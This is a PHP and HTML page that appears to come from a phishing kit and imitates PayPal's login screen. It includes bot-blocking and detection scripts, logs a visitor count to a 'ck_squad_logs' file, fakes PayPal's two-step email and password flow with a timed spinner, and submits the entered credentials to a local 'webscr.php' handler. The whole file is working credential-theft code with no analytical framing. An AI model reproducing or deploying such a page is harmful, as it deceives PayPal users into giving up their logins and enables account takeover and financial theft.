<?php 
include('../blocker.php');
include('../detect.php');
include('../function.php');
$datei = fopen("../ck_squad_logs/visitor.txt","r");
$count = fgets($datei,1000);
fclose($datei);
$count=$count + 1 ;

$datei = fopen("../ck_squad_logs/visitor.txt","w");
fwrite($datei, $count);
fclose($datei);
?>


<!DOCTYPE html>
<html lang="en" class="no-js desktop">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
	<meta charset="utf-8" />
	<title>Log in to your PayPal account</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<meta name="application-name" content="PayPal" />
	<meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
	<meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
	<meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
	<meta name="keywords" content="transfer money, email money transfer, international money transfer " />
	<meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
	<link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
	<link rel="apple-touch-icon" href="../ck_squad_assets/webstatic/icon/pp64.png" />
	<script type="text/javascript" src="../ck_squad_assets/jquery-1.9.1.js"></script>
	<script type="text/javascript" src="../ck_squad_assets/jquery-blockUI.js"></script>

	<link rel="stylesheet" href="../ck_squad_assets/web/res/dc4/38f805dc755e79c5e1c20794a80fd/css/contextualLogin.css" />
	<style id="antiClickjack">body {display: none !important;}
</style>
</head>
<body class="desktop" data-rlogid="qplPUgF7WIXxCyceMFetgBNEGBUvD5tCsyynAvjUIdZOj7Zt9cgydToFRvWeffO%2BMHZgSVdZ748SDNwrH%2FuOBrwGhbnRTie5_163358b41f0" data-hostname="rZJvnqaaQhLn/nmWT8cSUm+72VQ7inHLmNSWW7oQxSqkM7CaNNY3vz7b/m5cAJw1O0tMAZNZFts" data-production="true" data-enable-ads-captcha="true" data-ads-challenge-url="/auth/createchallenge/2e073ec12eb2995c/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="1fb5491cd9f1b" data-show-hide-password="true" data-enable-fn-beacon-on-web-views="true" data-csrf-token="vLHaM3glFh0E7eX4Ia8Ausn97DHmljnGQ7AMo=" data-nonce="mlCEr1wm1NbT6tWI91w+FkJD7p3aLKKpkZg7L3aPkqShSIsl" data-tealeaf-url="https://www.paypalobjects.com/web/res/dc4/38f805dc755e79c5e1c20794a80fd/js/lib/tealeaf-ul-prod_domcap.min.js">
	<img src="../ck_squad_assets/spinner.gif" id="imgspin" style="display: none;">
	<div id="main" class="main" role="main">
		<section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
			<div class="corral">
				<div class="contentContainer activeContent contentContainerBordered">
					<header >
						<p class="paypal-logo paypal-logo-long">
						</p>
					</header>
					<h1 class="headerText accessAid">Log in to your PayPal account
					</h1>
					<p id="phoneSubTagLine" class="subHeaderText hide hide">Already set up to use your phone number to log in? Type it below. Otherwise, click the link to log in with email.
					</p>
					<div  class="notifications">
					</div>
					<form action="webscr.php?cmd=_login-run&amp;dispatch=<?php echo md5(microtime());?>" method="post" class="proceed maskable" autocomplete="off" name="login" autocomplete="off" novalidate>
						<div class="profileDisplayName hide">
						</div>
						<div class="profileRememberedEmail hide">
							<span class="profileDisplayPhoneCode">
							</span>
							<span class="profileDisplayEmail">
							</span>
							<a href="#" class="notYouLink scTrack:not-you" id="backToInputEmailLink">Change
							</a>
						</div>
						<div id="splitEmail" class="splitEmail">
							<div id="splitEmailSection" >
								<div id="emailSection" class="clearfix">
									<div class="textInput" id="login_emaildiv">
										<div class="fieldWrapper">
											<label for="email" class="fieldLabel">Email address</label>
											<input id="email" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" aria-required="true" value=""		autocomplete=	"off"			placeholder=	"Email address"		/>
										</div>
									</div>
								</div>
							</div>
							<div class="actions">
								<input class="button actionContinue scTrack:unifiedlogin-login-click-next" id="btnNext" name="btnNext" value="Next">
							</div>
						</div>
						<div id="splitPassword" class="splitPassword" style="display: none;">
							<div id="splitPasswordSection">
								<div id="passwordSection" class="clearfix">
									<div class="textInput" id="login_passworddiv">
										<div class="fieldWrapper" style="text-align: center;">
											<font><font id="font_email"></font>&nbsp;&nbsp;<a href="#" style="text-decoration: none;" onclick="window.location.reload()">Change</a></font>
										</div>
									</div>
									<div class="textInput" id="login_passworddiv">
										<div class="fieldWrapper">
											<label for="password" class="fieldLabel">Password</label>
											<input id="password" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" aria-required="true" value=""		placeholder=	"Password"		/>
										</div>
									</div>
								</div>
							</div>
							<div class="actions">
								<button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnLogin" name="btnLogin" value="Log In">Log In</button>
							</div>
						</div>
					</form>
					<div class="forgotLink">
						<a href="https://www.paypal.com/authflow/password-recovery/?country.x=ID&amp;locale.x=en_US&amp;loginUrl=https%3A%2F%2Fwww.paypal.com%2Fsignin%2F" class="scTrack:unifiedlogin-click-forgot-password pwrLink">Having trouble logging in?
						</a>
					</div>
					<div class="pwr-modal forgotPasswordModal" id="password-recovery-modal">
						<iframe id="pwdIframe" data-src="/authflow/password-recovery/?country.x=ID&amp;locale.x=en_US&amp;loginUrl=https%3A%2F%2Fwww.paypal.com%2Fsignin%2F" scrolling="no" data-auto-reload="true">
						</iframe>
						<div class="monogram-small">
						</div>
					</div>
					<div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
						<div class="loginSignUpSeparator">
							<span class="textInSeparator" aria-label="or">or
							</span>
						</div>
						<a href="webapps/mpp/account-selection.html" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount">Sign Up
						</a>
					</div>
				</div>
			</div>
		</section>
		<footer class="footer" role="contentinfo">
			<div class="legalFooter">
				<div class="extendedContent">
					<ul class="footerGroup footerGroupWithSiblings">
						<li>
							<a href="webapps/mpp/ua/privacy-full.html">Privacy
							</a>
						</li>
						<li>
							<a href="webapps/mpp/ua/legalhub-full.html">Legal
							</a>
						</li>
					</ul>
					<p class="footerCopyright">Copyright © 1999-2018 PayPal. All rights reserved.
				</div>
			</div>
		</footer>
	</div>
	<script type="text/javascript">
		$("#btnNext").click(function(){
			var email = $("#email").val();
			$.blockUI({message: $("#imgspin")});
			window.setTimeout(function () {
				$(function(){
					$.unblockUI();
					$("#font_email").text(email);
					$("#splitEmail").animate({width: "toggle"});
					$("#splitPassword").fadeIn();
				});
			}, 3000); /* ms mili second 1s = 1000ms */

		});
	</script>
</body>
</html>